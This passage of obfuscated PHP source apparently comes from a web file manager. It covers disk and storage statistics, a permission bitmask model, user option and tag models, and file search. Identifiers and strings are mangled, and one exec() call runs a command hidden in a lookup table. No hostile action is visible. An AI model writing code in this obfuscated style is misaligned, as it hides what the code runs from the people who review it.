array($ß€Å˜Øª[2153], $ß€Å˜Øª[2154], $ß€Å˜Øª[2155]), $ß€Å˜Øª[1557] => array($ß€Å˜Øª[2156], $ß€Å˜Øª[2157]), $ß€Å˜Øª[1558] => array($ß€Å˜Øª[2158], $ß€Å˜Øª[2159], $ß€Å˜Øª[2160])); $çÆ¥ßÛç = strtotime(date($ß€Å˜Øª[2122])); $˜ÌëÏ£¸ = array($ß€Å˜Øª[241] => array($ß€Å˜Øª[1178], $çÆ¥ßÛç)); if ($é¹İ…ú¯) { $˜ÌëÏ£¸[$ß€Å˜Øª[43]] = array($ß€Å˜Øª[7], $ü €ıÆÀ[$é¹İ…ú¯]); } $Š´Êœ÷´ = Model($ß€Å˜Øª[2125])->where($˜ÌëÏ£¸)->count($øò¿°à„); return (int) $Š´Êœ÷´; } private function optionServer() { $Ü´çÄ¬Ù =& $_SERVER[øşô´çË]; $¢Ù”’ûÙ = $this->diskDriver(); $”íòÏ× = KodIO::defaultDriver(); $“¾€›ñÄ = array($Ü´çÄ¬Ù[928] => $”íòÏ×[$Ü´çÄ¬Ù[496]]); $ÅòúÅØİ = Model($Ü´çÄ¬Ù[569])->where($“¾€›ñÄ)->sum($Ü´çÄ¬Ù[89]); $öÜ¸›àß = explode($Ü´çÄ¬Ù[63], $_SERVER[$Ü´çÄ¬Ù[154]]); $ùœ¯«Å = $öÜ¸›àß[0]; $¿Æ‘µè° = $GLOBALS[$Ü´çÄ¬Ù[6]][$Ü´çÄ¬Ù[31]]; $‘¨ª½ó = $¿Æ‘µè°[$Ü´çÄ¬Ù[1140]]; if ($‘¨ª½ó == $Ü´çÄ¬Ù[1128]) { $Ğ˜±Úñ = explode($Ü´çÄ¬Ù[1469], $¿Æ‘µè°[$Ü´çÄ¬Ù[1139]]); $‘¨ª½ó = $Ğ˜±Úñ[0]; } if ($‘¨ª½ó == $Ü´çÄ¬Ù[1073] || $‘¨ª½ó == $Ü´çÄ¬Ù[903]) { $·ŞŸ±î† = Model()->db()->query($Ü´çÄ¬Ù[2161]); $çˆ¬˜å¥ = $·ŞŸ±î†[0] && isset($·ŞŸ±î†[0][$Ü´çÄ¬Ù[1861]]) ? $·ŞŸ±î†[0][$Ü´çÄ¬Ù[1861]] : 0; $‘¨ª½ó = $Ü´çÄ¬Ù[2162] . ($çˆ¬˜å¥ ? $Ü´çÄ¬Ù[8] . $çˆ¬˜å¥ : $Ü´çÄ¬Ù[12]); } $ú”’³À™ = $GLOBALS[$Ü´çÄ¬Ù[6]][$Ü´çÄ¬Ù[433]][$Ü´çÄ¬Ù[982]]; return array($Ü´çÄ¬Ù[2163] => $¢Ù”’ûÙ ? $¢Ù”’ûÙ[$Ü´çÄ¬Ù[2164]] : 0, $Ü´çÄ¬Ù[2165] => $¢Ù”’ûÙ ? $¢Ù”’ûÙ[$Ü´çÄ¬Ù[2166]] : 0, $Ü´çÄ¬Ù[2167] => (int) $”íòÏ×[$Ü´çÄ¬Ù[2164]] * 1024 * 1024 * 1024, $Ü´çÄ¬Ù[2168] => (int) $ÅòúÅØİ, $Ü´çÄ¬Ù[2169] => ucfirst($ùœ¯«Å), $Ü´çÄ¬Ù[2170] => $Ü´çÄ¬Ù[2171] . PHP_VERSION, $Ü´çÄ¬Ù[2172] => phpBuild64() ? 64 : 32, $Ü´çÄ¬Ù[860] => str_replace($Ü´çÄ¬Ù[1304], $Ü´çÄ¬Ù[1156], $‘¨ª½ó), $Ü´çÄ¬Ù[433] => ucfirst($ú”’³À™), $Ü´çÄ¬Ù[42] => $_SERVER[$Ü´çÄ¬Ù[2173]]); } private function diskDriver() { $™´„‘³¿ =& $_SERVER[øşô´çË]; $–ÁÌ¥Î = $™´„‘³¿[8]; $‚Ëõ¿Ÿ = $GLOBALS[$™´„‘³¿[6]][$™´„‘³¿[1493]] == $™´„‘³¿[1494]; if ($‚Ëõ¿Ÿ) { $–ÁÌ¥Î = $™´„‘³¿[2174]; if (function_exists($™´„‘³¿[2175])) { exec($™´„‘³¿[2176], $«Ä¸Ó±™); $–ÁÌ¥Î = $«Ä¸Ó±™[1] . $™´„‘³¿[8]; } } if (!file_exists($–ÁÌ¥Î)) { return; } if (!function_exists($™´„‘³¿[2177])) { return; } $ê“úâÒº = @disk_total_space($–ÁÌ¥Î); $¾äèœûÓ = $ê“úâÒº - @disk_free_space($–ÁÌ¥Î); return array($™´„‘³¿[2164] => $ê“úâÒº, $™´„‘³¿[2166] => $¾äèœûÓ); } public function fileChart($úéí¥Ò) { $„Ç¨øÍû =& $_SERVER[øşô´çË]; $µ¾ûŞĞõ = Model($„Ç¨øÍû[935]); if (isset($úéí¥Ò[$„Ç¨øÍû[1588]])) { return $µ¾ûŞĞõ->userFileTypeProfile($úéí¥Ò[$„Ç¨øÍû[1588]]); } if (isset($úéí¥Ò[$„Ç¨øÍû[1491]])) { return $µ¾ûŞĞõ->groupFileTypeProfile($úéí¥Ò[$„Ç¨øÍû[1491]]); } $¢ÀÃ€øÓ = $this->sourceSize(); return array($„Ç¨øÍû[866] => $¢ÀÃ€øÓ[$„Ç¨øÍû[89]], $„Ç¨øÍû[2115] => $¢ÀÃ€øÓ[$„Ç¨øÍû[2115]], $„Ç¨øÍû[2116] => $µ¾ûŞĞõ->where(array($„Ç¨øÍû[198] => 1, $„Ç¨øÍû[200] => 0))->sum($„Ç¨øÍû[89]), $„Ç¨øÍû[2117] => $µ¾ûŞĞõ->where(array($„Ç¨øÍû[198] => 2, $„Ç¨øÍû[200] => 0))->sum($„Ç¨øÍû[89])); } private function sourceSize() { $êíÆİşÁ =& $_SERVER[øşô´çË]; $ ¦¡´ô¤ = Model($êíÆİşÁ[935])->where(array($êíÆİşÁ[509] => 0))->sum($êíÆİşÁ[89]); $®˜ş‘ìî = Model($êíÆİşÁ[2178])->sum($êíÆİşÁ[89]); $¡ÇöÌù‡ = Model($êíÆİşÁ[569])->sum($êíÆİşÁ[89]); return array($êíÆİşÁ[89] => (int) $ ¦¡´ô¤ + (int) $®˜ş‘ìî, $êíÆİşÁ[2115] => (int) $¡ÇöÌù‡); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $…›¾ºÂÄ =& $_SERVER[øşô´çË]; $ÛĞóÎ® = array(array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2179]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2181], $…›¾ºÂÄ[2182] => 1, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2185]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2186], $…›¾ºÂÄ[2182] => 2, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2187]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2188], $…›¾ºÂÄ[2182] => 3, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2189]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2190], $…›¾ºÂÄ[2182] => 4, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_VIEW), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2191]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2192], $…›¾ºÂÄ[2182] => 5, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2193]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2194], $…›¾ºÂÄ[2182] => 6, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($…›¾ºÂÄ[518] => LNG($…›¾ºÂÄ[2195]), $…›¾ºÂÄ[2180] => $…›¾ºÂÄ[2196], $…›¾ºÂÄ[2182] => 7, $…›¾ºÂÄ[2183] => 1, $…›¾ºÂÄ[2184] => 0)); return $ÛĞóÎ®; } public static function authCheck($òÜÇÜÓÊ, $­¨Œ ´, $ß¯ºÈÇ˜ = true) { $§İñÂ¾‘ =& $_SERVER[øşô´çË]; $òÜÇÜÓÊ = intval($òÜÇÜÓÊ); if ($ß¯ºÈÇ˜) { if (KodUser::isRoot() && $GLOBALS[$§İñÂ¾‘[6]][$§İñÂ¾‘[2197]]) { return !0; } } if ($òÜÇÜÓÊ <= 0) { return !1; } if (($òÜÇÜÓÊ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($òÜÇÜÓÊ & $­¨Œ ´); } public static function authCheckShow($ÈŒ‘­ğÓ) { return self::authCheck($ÈŒ‘­ğÓ, self::AUTH_SHOW); } public static function authCheckView($‰Ì¹Ø…) { return self::authCheck($‰Ì¹Ø…, self::AUTH_VIEW); } public static function authCheckDownload($ö¶Ì¥Æ) { return self::authCheck($ö¶Ì¥Æ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ä„‘âÚÓ) { return self::authCheck($Ä„‘âÚÓ, self::AUTH_UPLOAD); } public static function authCheckEdit($Ş˜) { return self::authCheck($Ş˜, self::AUTH_EDIT); } public static function authCheckRemove($®±ëŞÇÍ) { return self::authCheck($®±ëŞÇÍ, self::AUTH_REMOVE); } public static function authCheckShare($½ñËÍøù) { return self::authCheck($½ñËÍøù, self::AUTH_SHARE); } public static function authCheckComment($ÍßÜ•°º) { return self::authCheck($ÍßÜ•°º, self::AUTH_COMMENT); } public static function authCheckEvent($€éó•³ï) { return self::authCheck($€éó•³ï, self::AUTH_EVENT); } public static function authCheckRoot($–¢¸‹Ôı) { return self::authCheck($–¢¸‹Ôı, self::AUTH_ROOT); } public static function authCheckAction($¼æşÀÑâ, $œŒÂ‰Åï) { $¢Ó÷ñ¬ç =& $_SERVER[øşô´çË]; $À¡¨£öÉ = array($¢Ó÷ñ¬ç[1555] => self::AUTH_SHOW, $¢Ó÷ñ¬ç[1556] => self::AUTH_VIEW, $¢Ó÷ñ¬ç[1381] => self::AUTH_DOWNLOAD, $¢Ó÷ñ¬ç[117] => self::AUTH_UPLOAD, $¢Ó÷ñ¬ç[1557] => self::AUTH_EDIT, $¢Ó÷ñ¬ç[1330] => self::AUTH_REMOVE, $¢Ó÷ñ¬ç[1558] => self::AUTH_SHARE, $¢Ó÷ñ¬ç[438] => self::AUTH_COMMENT, $¢Ó÷ñ¬ç[1559] => self::AUTH_EVENT, $¢Ó÷ñ¬ç[1560] => self::AUTH_ROOT); if (!isset($À¡¨£öÉ[$œŒÂ‰Åï])) { return; } $‘ÊæÓÖµ = $À¡¨£öÉ[$œŒÂ‰Åï]; $¼æşÀÑâ = intval($¼æşÀÑâ); if ($¼æşÀÑâ <= 0) { return !1; } if (($¼æşÀÑâ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¼æşÀÑâ & $‘ÊæÓÖµ); } public static function authDisable($Ãµ—Â¨À, $±®§Ñˆ€) { if (intval($Ãµ—Â¨À) <= 0) { return 0; } return intval($Ãµ—Â¨À) & ~$±®§Ñˆ€; } public $optionType = "\x53\x79\x73\x74\x65\155\56\163\x6f\x75\x72\143\x65\101\165\x74\150\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\141\165\x74\x68", "\154\141\142\145\154", "\x64\151\163\x70\x6c\x61\171", "\x73\x79\x73\x74\x65\155", "\163\157\x72\164"); public function initData() { $ğƒ°Ğò = $this->authDefault(); foreach ($ğƒ°Ğò as $õŒšíÊ) { $this->add($õŒšíÊ); } } public function findAuth($äÅ×’Ì©, $¾—Ş–“å) { $¯…è–ı™ =& $_SERVER[øşô´çË]; $óõ‘·†ğ = parent::listData(); foreach ($óõ‘·†ğ as $á•¥óÜ) { $æÖ—â»ã = intval($á•¥óÜ[$¯…è–ı™[511]]); if ($æÖ—â»ã <= 0 || $á•¥óÜ[$¯…è–ı™[2198]] == 0) { continue; } if (($æÖ—â»ã & $äÅ×’Ì©) != $äÅ×’Ì©) { continue; } if (($æÖ—â»ã & $¾—Ş–“å) != 0) { continue; } return $á•¥óÜ[$¯…è–ı™[496]]; } return !1; } public function findAuthMax($½¯…Ñò, $õÒ…‚Æœ) { $¾ÄĞó³ =& $_SERVER[øşô´çË]; $¼äŞÖƒï = !1; $îüûû¶¡ = parent::listData(); foreach ($îüûû¶¡ as $¾¬ÛŠ›í) { $Ä²€ŸÈâ = intval($¾¬ÛŠ›í[$¾ÄĞó³[511]]); if ($Ä²€ŸÈâ <= 0 || $¾¬ÛŠ›í[$¾ÄĞó³[2198]] == 0) { continue; } if (($Ä²€ŸÈâ & $½¯…Ñò) != $½¯…Ñò) { continue; } if (($Ä²€ŸÈâ & $õÒ…‚Æœ) != 0) { continue; } if (!$¼äŞÖƒï) { $¼äŞÖƒï = $¾¬ÛŠ›í; continue; } if (intval($¼äŞÖƒï[$¾ÄĞó³[511]]) < $Ä²€ŸÈâ) { $¼äŞÖƒï = $¾¬ÛŠ›í; } } return $¼äŞÖƒï ? $¼äŞÖƒï[$¾ÄĞó³[496]] : !1; } public function findAuthReadOnly() { $Ë”œçŞš = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $õæÍ‹ƒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ë”œçŞš, $õæÍ‹ƒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÒıºÖ³Ö =& $_SERVER[øşô´çË]; $İ–‚éªğ = parent::listData(); $Ú†ùöë = !1; foreach ($İ–‚éªğ as $ê–ú¹¤½) { if ($ê–ú¹¤½[$ÒıºÖ³Ö[511]] <= 0 || $ê–ú¹¤½[$ÒıºÖ³Ö[2198]] == $ÒıºÖ³Ö[238]) { continue; } if (!$Ú†ùöë) { $Ú†ùöë = $ê–ú¹¤½; continue; } if ($Ú†ùöë[$ÒıºÖ³Ö[511]] > $ê–ú¹¤½[$ÒıºÖ³Ö[511]]) { $Ú†ùöë = $ê–ú¹¤½; } } return $Ú†ùöë ? $Ú†ùöë[$ÒıºÖ³Ö[496]] : $ÒıºÖ³Ö[12]; } public function listData($ıÜ“ÄÌ– = false, $À£Á¦à = "\163\x6f\x72\x74", $ÙÌñâêÖ = false) { return parent::listData($ıÜ“ÄÌ–, $À£Á¦à, $ÙÌñâêÖ); } public function update($âó“ôéŠ, $Ìçú”ù) { $ßÏÂ¶ê³ =& $_SERVER[øşô´çË]; $·æƒİ’½ = parent::listData($âó“ôéŠ); $ªû˜á¥µ = $this->findByName($Ìçú”ù[$ßÏÂ¶ê³[42]]); if (!$·æƒİ’½ || $ªû˜á¥µ && $ªû˜á¥µ[$ßÏÂ¶ê³[496]] != $·æƒİ’½[$ßÏÂ¶ê³[496]]) { return !1; } $this->filterAuth($Ìçú”ù[$ßÏÂ¶ê³[511]]); return parent::update($âó“ôéŠ, $Ìçú”ù); } public function remove($Ä´¾ß›) { $¼÷±áğÍ = parent::listData($Ä´¾ß›); if (!$¼÷±áğÍ || $¼÷±áğÍ[$_SERVER[øşô´çË][199]]) { return !1; } return parent::remove($Ä´¾ß›); } public function add($àİ•ıÚã = array()) { $¶èÏÉß =& $_SERVER[øşô´çË]; if ($this->findByName($àİ•ıÚã[$¶èÏÉß[42]])) { return !1; } $”Ş”Ù½‘ = array($¶èÏÉß[42] => $¶èÏÉß[12], $¶èÏÉß[511] => 1, $¶èÏÉß[2199] => $¶èÏÉß[2188], $¶èÏÉß[2198] => 1, $¶èÏÉß[199] => 0, $¶èÏÉß[2200] => 0); $àİ•ıÚã = array_merge($”Ş”Ù½‘, $àİ•ıÚã); $àİ•ıÚã[$¶èÏÉß[2200]] = $this->getSort(); $this->filterAuth($àİ•ıÚã[$¶èÏÉß[511]]); return parent::insert($àİ•ıÚã); } private function getSort() { $‘ûÀ =& $_SERVER[øşô´çË]; $ªâ‘ÙØ = parent::listData(); $¾ÄÚÊÄ› = array_to_keyvalue($ªâ‘ÙØ, $‘ûÀ[12], $‘ûÀ[2200]); return empty($¾ÄÚÊÄ›) ? 0 : max($¾ÄÚÊÄ›) + 1; } private function filterAuth(&$İÚÁ§û¾) { if (!$İÚÁ§û¾) { return; } $Ç¯–±×¶ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $òöãš·² = array(); foreach ($Ç¯–±×¶ as $‹òÊ¬¹) { if ($İÚÁ§û¾ & $‹òÊ¬¹) { $òöãš·²[] = $‹òÊ¬¹; } } if (in_array(self::AUTH_ROOT, $òöãš·²)) { $İÚÁ§û¾ = array_sum($Ç¯–±×¶); return; } $Ó¨³áÎ« = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($òöãš·² as $‹òÊ¬¹) { if (isset($Ó¨³áÎ«[$‹òÊ¬¹])) { $òöãš·² = array_merge($òöãš·², $Ó¨³áÎ«[$‹òÊ¬¹]); } } $òöãš·²[] = self::AUTH_SHOW; $İÚÁ§û¾ = array_sum(array_unique($òöãš·²)); } public function sort($›áçÕíù, $›Ú®Ü²‡) { return parent::update($›áçÕíù, $›Ú®Ü²‡); } } goto DğÜÊÖÕ†; bïŞ¼·êªÜ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Š¨Õâ¨Ê) { return "\125\x73\145\162\117\x70\164\151\x6f\x6e\137{$Š¨Õâ¨Ê}\137" . KodUser::id(); } protected function filterWhere($²•îéùÇ) { $²•îéùÇ[$_SERVER[øşô´çË][1588]] = KodUser::id(); return $²•îéùÇ; } public function cacheRemoveUser($İİÊ¥, $Ã™âÖ°¯) { return Cache::remove("\125\x73\145\x72\117\160\x74\x69\x6f\x6e\137{$İİÊ¥}\137" . $Ã™âÖ°¯); } protected function optionDefault($£Á«ï‡˜ = '') { $¹àèŞÙ¸ =& $_SERVER[øşô´çË]; if ($£Á«ï‡˜ == $¹àèŞÙ¸[12]) { return $GLOBALS[$¹àèŞÙ¸[6]][$¹àèŞÙ¸[2714]]; } if ($£Á«ï‡˜ == $¹àèŞÙ¸[2715]) { return $GLOBALS[$¹àèŞÙ¸[6]][$¹àèŞÙ¸[2716]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\x74\x61\x67\x4c\151\x73\164"; public $modelType = "\125\x73\145\162\117\x70\x74\151\x6f\156"; public $field = array("\156\141\155\145", "\x73\x74\171\x6c\145", "\x73\157\x72\164"); public function listData($şûæÙ = false, $åïÊÈœ = "\x73\x6f\162\164", $ÛÀØó‰ò = false) { return parent::listData($şûæÙ, $åïÊÈœ, $ÛÀØó‰ò); } public function remove($œî—õ³) { return parent::remove($œî—õ³); } public function add($Œ“ÙÉÇ, $°¼š’Ü¨ = "\154\x61\x62\145\154\55\x67\162\x65\171\x2d\x6e\x6f\x72\x6d\141\x6c") { $˜š¨•ÙÚ =& $_SERVER[øşô´çË]; if ($this->findByName($Œ“ÙÉÇ)) { return !1; } $õàÖÉ„á = array($˜š¨•ÙÚ[518] => $Œ“ÙÉÇ, $˜š¨•ÙÚ[583] => $°¼š’Ü¨, $˜š¨•ÙÚ[2182] => $this->getSort($˜š¨•ÙÚ[344]) + 1); return parent::insert($õàÖÉ„á); } public function update($¿—¢ß‘Ñ, $ÃÕûƒ¤) { $ÖÀ²€ÃÁ =& $_SERVER[øşô´çË]; $§Ãä‚²¨ = $this->listData($¿—¢ß‘Ñ); $óãµ‘ ı = $this->findByName($ÃÕûƒ¤[$ÖÀ²€ÃÁ[42]]); if (!$§Ãä‚²¨ || $óãµ‘ ı && $óãµ‘ ı[$ÖÀ²€ÃÁ[496]] != $§Ãä‚²¨[$ÖÀ²€ÃÁ[496]]) { return !1; } return parent::update($¿—¢ß‘Ñ, $ÃÕûƒ¤); } public function moveTop($ê¬ÜÍ¸) { $™ü¶·† =& $_SERVER[øşô´çË]; $‹íš§¸ = parent::listData(); $¢‰îÉ¸± = $this->getSort($™ü¶·†[343]); foreach ($‹íš§¸ as &$Úò¾¾ê×) { if ($Úò¾¾ê×[$™ü¶·†[496]] == $ê¬ÜÍ¸) { $Úò¾¾ê×[$™ü¶·†[2200]] = $¢‰îÉ¸±; continue; } $Úò¾¾ê×[$™ü¶·†[2200]] += 1; } unset($Úò¾¾ê×); return parent::resetData($‹íš§¸); } public function moveBottom($”’¤…¼ü) { $›•¶ƒÜÜ =& $_SERVER[øşô´çË]; $ª¿ˆË˜µ = $this->getSort($›•¶ƒÜÜ[344]) + 1; return parent::update($”’¤…¼ü, array($›•¶ƒÜÜ[2200] => $ª¿ˆË˜µ)); } public function resetSort($œŠÜÛ«ˆ) { $ÊóÑ×° =& $_SERVER[øşô´çË]; $‹×æğÏÃ = array(); $œŠÜÛ«ˆ = is_array($œŠÜÛ«ˆ) ? $œŠÜÛ«ˆ : array(); for ($œ®›‚Ó¹ = 0; $œ®›‚Ó¹ < count($œŠÜÛ«ˆ); $œ®›‚Ó¹++) { $‹×æğÏÃ[$œŠÜÛ«ˆ[$œ®›‚Ó¹] . $ÊóÑ×°[12]] = $œ®›‚Ó¹ + 1; } $‰¤òñ•Ò = parent::listData(); foreach ($‰¤òñ•Ò as &$¢Å†úß¾) { $«³ÜÃ€ï = $‹×æğÏÃ[$¢Å†úß¾[$ÊóÑ×°[496]]]; $¢Å†úß¾[$ÊóÑ×°[2200]] = $«³ÜÃ€ï ? $«³ÜÃ€ï : $¢Å†úß¾[$ÊóÑ×°[2200]]; } unset($¢Å†úß¾); return parent::resetData($‰¤òñ•Ò); } private function getSort($®¾öúÀˆ) { $©Š£œ =& $_SERVER[øşô´çË]; $ÏÍÒÁº¬ = parent::listData(); $ÑœôÚ˜ = array_to_keyvalue($ÏÍÒÁº¬, $©Š£œ[12], $©Š£œ[2200]); if (!$ÑœôÚ˜) { $ÑœôÚ˜ = array(0); } $°ç³é’¦ = $®¾öúÀˆ == $©Š£œ[344] ? max($ÑœôÚ˜) : min($ÑœôÚ˜); return intval($°ç³é’¦); } } goto Dº›—öŠª; a‹Ë»ˆ¨Ğ¥: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($µ¨»€À¦) { $—©Û‡¾ =& $_SERVER[øşô´çË]; $ÉêšãòŞ = KodIO::fileTypeList(); $ä‰É‡äË = $ÉêšãòŞ[$µ¨»€À¦]; if (!$ä‰É‡äË) { return array(); } $×¿²’Ìû = $ä‰É‡äË[$—©Û‡¾[176]]; $¯†œŒÎĞ = $—©Û‡¾[7]; if (!$ä‰É‡äË[$—©Û‡¾[176]]) { $Ä®™ÍÏ… = array_to_keyvalue($ÉêšãòŞ, $—©Û‡¾[12], $—©Û‡¾[176]); $×¿²’Ìû = implode($—©Û‡¾[60], $Ä®™ÍÏ…); $¯†œŒÎĞ = $—©Û‡¾[2442]; } $ğïÆŠäÁ = explode($—©Û‡¾[60], trim($×¿²’Ìû, $—©Û‡¾[60])); return array($¯†œŒÎĞ, $ğïÆŠäÁ); } public function listPathType($ÌºÕ†¨) { $À“õ—È® =& $_SERVER[øşô´çË]; $¤Æ†è¶µ = $this->fileTypeWhere($ÌºÕ†¨); if (!$¤Æ†è¶µ) { return array(); } $ã´³é = USER_ID; $É×˜Àß = Model($À“õ—È®[626])->getInfo($ã´³é); $©Š¿Îª¿ = array($À“õ—È®[679] => SourceModel::TYPE_USER, $À“õ—È®[613] => array($À“õ—È®[644], $À“õ—È®[622] . $É×˜Àß[$À“õ—È®[100]][$À“õ—È®[201]] . $À“õ—È®[645]), $À“õ—È®[680] => $ã´³é, $À“õ—È®[677] => 0, $À“õ—È®[678] => $¤Æ†è¶µ); return $this->listSource($©Š¿Îª¿); } public function listSearch($îş•…û, $´æ ›° = 300) { $ã›Î¸à± =& $_SERVER[øşô´çË]; if (isset($îş•…û[$ã›Î¸à±[2276]]) && $îş•…û[$ã›Î¸à±[2276]]) { $îş•…û[$ã›Î¸à±[2276]] = str_replace($ã›Î¸à±[483], $ã›Î¸à±[2443], trim($îş•…û[$ã›Î¸à±[2276]])); } $°îÚ«â = $this->_parseSearchWhere($îş•…û); if (!isset($°îÚ«â[$ã›Î¸à±[529]])) { $°îÚ«â[$ã›Î¸à±[529]] = 0; } $ˆ¨ı°­¡ = $ã›Î¸à±[2444]; $öóÕÎ‘Ñ = $°îÚ«â; $Éú…½¤ = $ˆ¨ı°­¡; $this->_listSearchBindPinyin($îş•…û, $°îÚ«â, $ˆ¨ı°­¡); $this->alias($ã›Î¸à±[542])->_makeOrder(); $°îÚ«â = $this->parseWhereLike($°îÚ«â); $ã…ÇïÖ = $this->distinct(!0)->field($ˆ¨ı°­¡)->where($°îÚ«â)->selectPage($´æ ›°); if ($GLOBALS[$ã›Î¸à±[6]][$ã›Î¸à±[477]][$ã›Î¸à±[478]] && Input::check($îş•…û[$ã›Î¸à±[2276]], $ã›Î¸à±[686]) && $ã…ÇïÖ[$ã›Î¸à±[452]][$ã›Î¸à±[437]] == 1 && $ã…ÇïÖ[$ã›Î¸à±[452]][$ã›Î¸à±[453]] == 0) { $ã…ÇïÖ = $this->distinct(!0)->field($ˆ¨ı°­¡)->where($öóÕÎ‘Ñ)->limit(1000)->select(); $ã…ÇïÖ = array_page_split($ã…ÇïÖ, !1, $´æ ›°); } $this->_listSearchFileContent($ã…ÇïÖ, $îş•…û, $Éú…½¤, $öóÕÎ‘Ñ); $this->_listSearchDesc($ã…ÇïÖ, $îş•…û, $Éú…½¤); $this->_listSearchTag($ã…ÇïÖ, $îş•…û, $Éú…½¤); $this->_listSearchGroupTag($ã…ÇïÖ, $îş•…û, $Éú…½¤); $this->_listDataApply($ã…ÇïÖ[$ã›Î¸à±[455]]); $this->_listMake($ã…ÇïÖ); return $ã…ÇïÖ; } private function _listSearchFileContent(&$°¿‰”ç¤, $Ã²ŞîÛÊ, $Ó·Â°®, $âÉÄ„¥) { $ê”ığÁà =& $_SERVER[øşô´çË]; if (!$Ã²ŞîÛÊ[$ê”ığÁà[2276]] || $°¿‰”ç¤[$ê”ığÁà[452]][$ê”ığÁà[437]] > 1) { return; } if (!isset($âÉÄ„¥[$ê”ığÁà[42]]) || !is_array($Ã²ŞîÛÊ[$ê”ığÁà[566]]) || !$Ã²ŞîÛÊ[$ê”ığÁà[566]]) { return; } $âÉÄ„¥[$ê”ığÁà[566]] = array($ê”ığÁà[7], $Ã²ŞîÛÊ[$ê”ığÁà[566]]); unset($âÉÄ„¥[$ê”ığÁà[42]]); unset($Ã²ŞîÛÊ[$ê”ığÁà[566]]); $ñïüÎ‰± = $this->field($Ó·Â°®)->where($âÉÄ„¥)->limit($ê”ığÁà[2445])->select(); $ñïüÎ‰± = array_to_keyvalue($ñïüÎ‰±, $ê”ığÁà[201], $ê”ığÁà[12]); $Ş×±Ş¬  = array_to_keyvalue($°¿‰”ç¤[$ê”ığÁà[455]], $ê”ığÁà[201], $ê”ığÁà[12]); $¹œàâŒª = array(); foreach ($ñïüÎ‰± as $‚’§şğ˜ => $›ÕŞ“ˆè) { if (!$Ş×±Ş¬ [$‚’§şğ˜]) { $¹œàâŒª[] = $›ÕŞ“ˆè; } } if (!$¹œàâŒª) { return; } $°¿‰”ç¤[$ê”ığÁà[455]] = array_merge($¹œàâŒª, $°¿‰”ç¤[$ê”ığÁà[455]]); $°¿‰”ç¤[$ê”ığÁà[452]][$ê”ığÁà[453]] += count($¹œàâŒª); } private function _listSearchTag(&$¿™óş¨, $«À’î¢®, $¤·ášìÅ) { $’•¤™½Æ =& $_SERVER[øşô´çË]; if (empty($«À’î¢®[$’•¤™½Æ[2139]]) || !in_array($’•¤™½Æ[2446], $«À’î¢®[$’•¤™½Æ[2139]])) { return; } if (!$«À’î¢®[$’•¤™½Æ[2276]] || 